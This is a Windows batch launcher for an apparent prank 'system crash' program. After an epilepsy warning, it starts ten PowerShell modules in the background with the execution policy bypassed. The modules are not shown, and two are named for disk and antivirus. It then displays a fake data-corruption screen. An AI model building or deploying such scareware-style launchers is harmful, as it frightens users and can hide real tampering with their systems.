@echo off
title Carboxyhemoglobin - System Crash
color 0c
cls

:: ============================================================
:: KULLANICIYA UYARI GÖSTER (EPİLEPSİ)
:: ============================================================
echo ============================================================
echo   ⚠️  CRITICAL SYSTEM WARNING  ⚠️
echo ============================================================
echo   This application may cause intense light flashes
echo   and sudden loud sounds. Do not proceed if you are
echo   sensitive to light or have epilepsy.
echo ============================================================
echo.
echo   Press any key to continue...
pause >nul

:: ============================================================
:: TÜM MODÜLLERİ BAŞLAT (arka planda)
:: ============================================================
start /b powershell -ExecutionPolicy Bypass -File modul_ses.ps1
start /b powershell -ExecutionPolicy Bypass -File modul_ekran.ps1
start /b powershell -ExecutionPolicy Bypass -File modul_mesaj.ps1
start /b powershell -ExecutionPolicy Bypass -File modul_disk.ps1
start /b powershell -ExecutionPolicy Bypass -File modul_antivirus.ps1
start /b powershell -ExecutionPolicy Bypass -File modul_tarayici.ps1
start /b powershell -ExecutionPolicy Bypass -File modul_fare.ps1
start /b powershell -ExecutionPolicy Bypass -File modul_sistem.ps1
start /b powershell -ExecutionPolicy Bypass -File modul_zaman.ps1
start /b powershell -ExecutionPolicy Bypass -File modul_hata.ps1

:: ============================================================
:: ANA EKRAN (BEKLEME)
:: ============================================================
cls
echo ============================================================
echo   ☢️  CARBOXYHEMOGLOBIN ACTIVATED  ☢️
echo ============================================================
echo   System failure detected.
echo   Critical data corruption in progress.
echo   Do not turn off your computer.
echo.
echo   This is a simulated event. No actual damage is caused.
echo ============================================================
echo.
echo   To stop, close this window or press CTRL+C.
pause >nul